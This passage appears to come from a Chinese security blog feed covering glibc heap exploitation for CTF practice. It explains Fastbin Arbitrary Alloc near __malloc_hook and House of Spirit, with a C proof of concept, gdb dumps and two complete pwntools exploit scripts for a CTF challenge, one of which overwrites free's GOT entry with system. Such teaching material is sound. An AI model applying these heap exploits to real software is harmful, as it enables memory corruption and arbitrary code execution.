class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1b10</span> &lt;__malloc_hook&gt;: <span class="hljs-number">0</span>x30    <span class="hljs-number">0</span>x28    <span class="hljs-number">0</span>xa9    <span class="hljs-number">0</span>xf7    <span class="hljs-number">0</span>xff    <span class="hljs-number">0</span>x7f    <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br></code></pre></td></tr></table></figure><p>0x7ffff7dd1b10 是我们想要控制的 __malloc_hook 的地址，于是我们向上寻找是否可以错位出一个合法的 size 域。因为这个程序是 64 位的，因此 fastbin 的范围为 32 字节到 128 字节 (0x20-0x80)，如下：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-comment">//这里的size指用户区域，因此要小2倍SIZE_SZ</span><br>Fastbins[idx=<span class="hljs-number">0</span>, size=<span class="hljs-number">0x10</span>]<br>Fastbins[idx=<span class="hljs-number">1</span>, size=<span class="hljs-number">0x20</span>]<br>Fastbins[idx=<span class="hljs-number">2</span>, size=<span class="hljs-number">0x30</span>]<br>Fastbins[idx=<span class="hljs-number">3</span>, size=<span class="hljs-number">0x40</span>]<br>Fastbins[idx=<span class="hljs-number">4</span>, size=<span class="hljs-number">0x50</span>]<br>Fastbins[idx=<span class="hljs-number">5</span>, size=<span class="hljs-number">0x60</span>]<br>Fastbins[idx=<span class="hljs-number">6</span>, size=<span class="hljs-number">0x70</span>]<br></code></pre></td></tr></table></figure><p>通过观察发现 0x7ffff7dd1af5 处可以现实错位构造出一个 0x000000000000007f</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x7ffff7dd1af0</span> <span class="hljs-number">0</span>x60 <span class="hljs-number">0</span>x2 <span class="hljs-number">0</span>xdd <span class="hljs-number">0</span>xf7 <span class="hljs-number">0</span>xff <span class="hljs-number">0</span>x7f <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1af8</span> <span class="hljs-number">0</span>x0  <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><br><span class="hljs-attribute">0x7ffff7dd1af5</span> &lt;_IO_wide_data_0+<span class="hljs-number">309</span>&gt;:   <span class="hljs-number">0</span>x000000000000007f<br></code></pre></td></tr></table></figure><p>因为 0x7f 在计算 fastbin index 时(64位)，是属于 index 5 的，即 chunk 大小为 0x70 的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">#<span class="hljs-meta">#<span class="hljs-keyword">define</span> fastbin_index(sz)                                                      </span><br>    ((((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>) (sz)) &gt;&gt; (SIZE_SZ == <span class="hljs-number">8</span> ? <span class="hljs-number">4</span> : <span class="hljs-number">3</span>)) - <span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>（注意 sz 的大小是 unsigned int，因此只占 4 个字节）</p><p>而其大小又包含了 0x10 的 chunk_header，因此我们选择分配 0x60 的 fastbin，将其加入链表。 最后经过两次分配可以观察到 chunk 被分配到 0x7ffff7dd1afd，因此我们就可以直接控制 __malloc_hook 的内容 (在我的 libc 中__realloc_hook 与__malloc_hook 是在连在一起的)。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">0x4005a8</span> &lt;main+<span class="hljs-number">66</span>&gt;        <span class="hljs-keyword">call</span>   <span class="hljs-number">0x400450</span> &lt;malloc@plt&gt;<br> →   <span class="hljs-number">0x4005ad</span> &lt;main+<span class="hljs-number">71</span>&gt;        <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x8</span>], <span class="hljs-built_in">rax</span><br><br> $<span class="hljs-built_in">rax</span>   : <span class="hljs-number">0x7ffff7dd1afd</span><br><br><span class="hljs-number">0x7ffff7dd1aed</span> &lt;_IO_wide_data_0+<span class="hljs-number">301</span>&gt;:   <span class="hljs-number">0xfff7dd0260000000</span>  <span class="hljs-number">0x000000000000007f</span><br><span class="hljs-number">0x7ffff7dd1afd</span>: <span class="hljs-number">0xfff7a92e20000000</span>  <span class="hljs-number">0xfff7a92a0000007f</span><br><span class="hljs-number">0x7ffff7dd1b0d</span> &lt;__realloc_hook+<span class="hljs-number">5</span>&gt;:  <span class="hljs-number">0x000000000000007f</span>  <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b1d</span>: <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></table></figure><h3 id="小总结-1"><a href="#小总结-1" class="headerlink" title="小总结"></a>小总结</h3><p>Arbitrary Alloc 在 CTF 中用地更加频繁。我们可以利用字节错位等方法来绕过 size 域的检验，实现任意地址分配 chunk，最后的效果也就相当于任意地址写任意值。</p>]]></content>
    
    
    <categories>
      
      <category>堆</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fastbin Attack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>House of Spirit攻击</title>
    <link href="/2024/08/02/House-of-Spirit%E6%94%BB%E5%87%BB/"/>
    <url>/2024/08/02/House-of-Spirit%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>House of Spirit是一种堆利用方法，其核心在于通过任意地址的释放达到篡改地址的目的。</p><p>利用条件：</p><ol><li>在目标地址周围能够伪造一个堆块。</li><li>能对伪造堆块地址周围进行一次释放（即将伪造的堆块地址作为free函数的参数进行一次释放操作）</li><li>释放之后能够重新申请得到这个堆块并篡改目标地址的内容</li></ol><p>这里给出一个POC代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> &#123;<br>setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>setvbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">long</span> <span class="hljs-type">long</span> data[<span class="hljs-number">0x20</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-type">int</span> size = <span class="hljs-number">0x70</span>;<br><span class="hljs-type">void</span> *p;<br>init();<br><span class="hljs-comment">// init arena</span><br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">// fake chunk header</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>,data);<br>data[<span class="hljs-number">0</span>] = <span class="hljs-number">0x0</span>;<br>data[<span class="hljs-number">1</span>] = size | <span class="hljs-number">1</span>; <span class="hljs-comment">// prev_inuse_bit</span><br><span class="hljs-comment">// fake next chunk header</span><br>data[size / <span class="hljs-number">8</span>] = <span class="hljs-number">0x0</span>;<br>data[(size / <span class="hljs-number">8</span>) + <span class="hljs-number">1</span>] = <span class="hljs-number">0x11</span>;<br>sleep(<span class="hljs-number">0</span>);<br><span class="hljs-comment">// free user data place, fd.</span><br><span class="hljs-built_in">free</span>(&amp;data[<span class="hljs-number">2</span>]);<br>sleep(<span class="hljs-number">0</span>);<br><span class="hljs-comment">// user&#x27;s size == chunk_size - 0x10</span><br>p = <span class="hljs-built_in">malloc</span>(size - <span class="hljs-number">0x10</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>,p);<br>sleep(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>gcc编译一下进行调试分析</p><p>运行结果如下</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408022055703.png" alt="运行结果"></p><p>调试命令如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">gdb House_of_Spirit<br>b <span class="hljs-built_in">sleep</span><br>r<br>x /20gz 0x6010a0<br></code></pre></td></tr></table></figure><p>x指令结果为</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408022100510.png" alt="x指令结果"></p><p>bins指令结果为</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408022149700.png" alt="bins指令结果"></p><p>可以看到我们伪造chunk成功，prev_size为0，size字段为0x71。</p><p>这里我们还需要伪造下一个chunk的头部，如果不伪造，就会报错。因为会检查下一个chunk的size字段，如果下一个chunk的字段不在正常范围内（2*SIZE_SZ到av-&gt;system_mem），则会报错退出，所以在伪造chunk的时候，不仅要伪造当前的chunk头，还要伪造下一个chunk的头部</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>例题下载：<a href="https://gitee.com/tky5216/CTF/raw/master/PWN/heap/pwn144_1604">例题</a></p><p>查看保护</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408022122900.png" alt="查看保护"></p><p>IDA反编译发现后门函数</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408022130508.png" alt="后门函数"></p><p>在main函数中满足一定条件可以调用后门函数</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408022129971.png" alt="main函数"></p><p>magic 为在 bss 段的全局变量，如果我们能够控制 v3 为 114514 并且覆写 magic 使其值⼤于 114514 ，就能get flag。</p><p>看菜单menu()</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408022131344.png" alt="菜单"></p><p>打开create_heap():</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408022133356.png" alt="create_heap"></p><p>heaparray 数组：存放 chunk 的⾸地址。</p><p>read_input(heaparray[i], size)：把我们输⼊的内容写⼊ chunk 中。</p><p>且heaparray是存放在bss段上</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408022133318.png" alt="bss段"></p><p>打开edit_heap():</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408022134629.png" alt="edit_heap"></p><p>可以再次编辑 chunk 的内容，⽽且可以选择输⼊⼤⼩。如果我们这次输⼊的 size ⽐创建时⼤的话，就会导致堆溢出</p><p>（read_input(heaparray[v1], v2)：向 chunk 中写⼊ v2 ⼤⼩的内容，也就是说如果 v2 ⽐ create 时的 size ⼤的话就会造成堆溢出。）</p><p>那么我们就可以用House of Spirit</p><p>攻击思路：</p><ol><li>首先创建俩个chunk，chunk0大小为0x10，chunk1的大小为0x60</li><li>然后删除chunk1</li><li>编辑chunk0造成堆溢出，修改chunk1的fd指针为0x000000000060208d</li><li>创建两个chunk大小都为0x60，第一个内容随意，第二个要构造payload覆盖magic的值</li><li>getflag</li></ol><p>需要注意的一点是，在我们修改fd指针时，需要连到一个合法的chunk头，</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408022144519.png" alt="内存分布"></p><p>这就是一个合法的chunk头，大小为0x70</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408022144814.png" alt="内存分布"></p><p>EXP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> re<br><br>filename = <span class="hljs-string">&#x27;./pwn144_1604&#x27;</span><br>url = <span class="hljs-string">&#x27;pwn.challenge.ctf.show 28271&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_hostname_and_port</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;([^:\s]+)[\s:](\d*)&#x27;</span>, url)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>        hostname = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)<br>        port = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">return</span> hostname, port<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br>hostname, port = extract_hostname_and_port(url)<br>debug_flag = <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">if</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>        p = remote(hostname, port)<br>    <span class="hljs-keyword">elif</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;debug&#x27;</span>:<br>        p = process(filename)<br>        debug_flag = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Usage: python script.py [remote|debug]&quot;</span>)<br>        exit(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    <span class="hljs-keyword">if</span> debug_flag:<br>        <span class="hljs-keyword">try</span>:<br>            gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">            b * main</span><br><span class="hljs-string">            b * 0x0000000000400B1A</span><br><span class="hljs-string">            b * 0x0000000000400C4A</span><br><span class="hljs-string">            b * 0x0000000000400D43</span><br><span class="hljs-string">            &#x27;&#x27;&#x27;</span><br>            gdb.attach(p, gdbscript=gdbscript)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;GDB attached successfully&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Failed to attach GDB: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;80&#x27;</span>]<br><br>elf = ELF(filename)<br>debug()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size , content</span>) :<br>  p.sendafter(<span class="hljs-string">&#x27;Your choice :&#x27;</span> , <span class="hljs-string">b&#x27;1&#x27;</span>)<br>  p.sendafter(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span> , <span class="hljs-built_in">str</span>(size))<br>  p.sendafter(<span class="hljs-string">&#x27;Content of heap:&#x27;</span> , content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx , size , content</span>) :<br>  p.sendafter(<span class="hljs-string">&#x27;Your choice :&#x27;</span> , <span class="hljs-string">b&#x27;2&#x27;</span>)<br>  p.sendafter(<span class="hljs-string">&#x27;Index :&#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br>  p.sendafter(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span> , <span class="hljs-built_in">str</span>(size))<br>  p.sendafter(<span class="hljs-string">&#x27;Content of heap : &#x27;</span> , content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>) :<br>  p.sendafter(<span class="hljs-string">&#x27;Your choice :&#x27;</span> , <span class="hljs-string">b&#x27;3&#x27;</span>)<br>  p.sendafter(<span class="hljs-string">&#x27;Index :&#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getflag</span>() :<br>  p.sendafter(<span class="hljs-string">&#x27;Your choice :&#x27;</span> , <span class="hljs-string">b&#x27;114514&#x27;</span>)  <br>add(<span class="hljs-number">0x10</span> , <span class="hljs-string">&#x27;aaaa&#x27;</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x60</span> , <span class="hljs-string">&#x27;bbbb&#x27;</span>) <span class="hljs-comment">#1</span><br>delete(<span class="hljs-number">1</span>) <span class="hljs-comment">#1</span><br>payload = <span class="hljs-number">0x18</span> * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(<span class="hljs-number">0x71</span>) + p64(<span class="hljs-number">0x000000000060208d</span>)<br>edit(<span class="hljs-number">0</span> , <span class="hljs-built_in">len</span>(payload) , payload)<br>add(<span class="hljs-number">0x60</span> , <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>) <span class="hljs-comment">#1</span><br>payload1 = <span class="hljs-number">0x23</span> * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(elf.got[<span class="hljs-string">&#x27;free&#x27;</span>])<br>add(<span class="hljs-number">0x60</span> , payload1) <span class="hljs-comment">#2</span><br>payload2 = p64(elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>])<br>edit(<span class="hljs-number">0</span> , <span class="hljs-built_in">len</span>(payload2) , payload2)<br>delete(<span class="hljs-number">1</span>)<br>p.interactive()<br><br><br><br><br><br><br><br></code></pre></td></tr></table></figure><p>这题一样可以用Arbitrary Alloc攻击，关于fastbin攻击等我研究透彻会进行总结，这里先贴个脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> re<br><br>filename = <span class="hljs-string">&#x27;./pwn144_1604&#x27;</span><br>url = <span class="hljs-string">&#x27;pwn.challenge.ctf.show 28271&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_hostname_and_port</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;([^:\s]+)[\s:](\d*)&#x27;</span>, url)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>        hostname = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)<br>        port = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">return</span> hostname, port<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br>hostname, port = extract_hostname_and_port(url)<br>debug_flag = <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">if</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>        p = remote(hostname, port)<br>    <span class="hljs-keyword">elif</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;debug&#x27;</span>:<br>        p = process(filename)<br>        debug_flag = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Usage: python script.py [remote|debug]&quot;</span>)<br>        exit(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    <span class="hljs-keyword">if</span> debug_flag:<br>        <span class="hljs-keyword">try</span>:<br>            gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">            b * main</span><br><span class="hljs-string">            b * 0x0000000000400B1A</span><br><span class="hljs-string">            b * 0x0000000000400C4A</span><br><span class="hljs-string">            b * 0x0000000000400D43</span><br><span class="hljs-string">            &#x27;&#x27;&#x27;</span><br>            gdb.attach(p, gdbscript=gdbscript)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;GDB attached successfully&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Failed to attach GDB: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;80&#x27;</span>]<br><br>elf = ELF(filename)<br>debug()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size , content</span>) :<br>  p.sendafter(<span class="hljs-string">&#x27;Your choice :&#x27;</span> , <span class="hljs-string">b&#x27;1&#x27;</span>)<br>  p.sendafter(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span> , <span class="hljs-built_in">str</span>(size))<br>  p.sendafter(<span class="hljs-string">&#x27;Content of heap:&#x27;</span> , content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx , size , content</span>) :<br>  p.sendafter(<span class="hljs-string">&#x27;Your choice :&#x27;</span> , <span class="hljs-string">b&#x27;2&#x27;</span>)<br>  p.sendafter(<span class="hljs-string">&#x27;Index :&#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br>  p.sendafter(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span> , <span class="hljs-built_in">str</span>(size))<br>  p.sendafter(<span class="hljs-string">&#x27;Content of heap : &#x27;</span> , content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>) :<br>  p.sendafter(<span class="hljs-string">&#x27;Your choice :&#x27;</span> , <span class="hljs-string">b&#x27;3&#x27;</span>)<br>  p.sendafter(<span class="hljs-string">&#x27;Index :&#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getflag</span>() :<br>  p.sendafter(<span class="hljs-string">&#x27;Your choice :&#x27;</span> , <span class="hljs-string">b&#x27;114514&#x27;</span>)  <br>add(<span class="hljs-number">0x10</span> , <span class="hljs-string">&#x27;aaaa&#x27;</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x60</span> , <span class="hljs-string">&#x27;bbbb&#x27;</span>) <span class="hljs-comment">#1</span><br>delete(<span class="hljs-number">1</span>) <span class="hljs-comment">#1</span><br>payload = <span class="hljs-number">0x18</span> * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(<span class="hljs-number">0x71</span>) + p64(<span class="hljs-number">0x000000000060208d</span>)<br>edit(<span class="hljs-number">0</span> , <span class="hljs-built_in">len</span>(payload) , payload)<br>add(<span class="hljs-number">0x60</span> , <span class="hljs-string">&#x27;aaaa&#x27;</span>) <span class="hljs-comment">#1</span><br>payload1 = <span class="hljs-number">0x3</span> * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(<span class="hljs-number">0x1BF60</span>)<br>add(<span class="hljs-number">0x60</span> , payload1) <span class="hljs-comment">#2</span><br>getflag()<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>堆</category>
      
    </categories>
    
    
    <tags>
      
      <tag>House of Spirit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
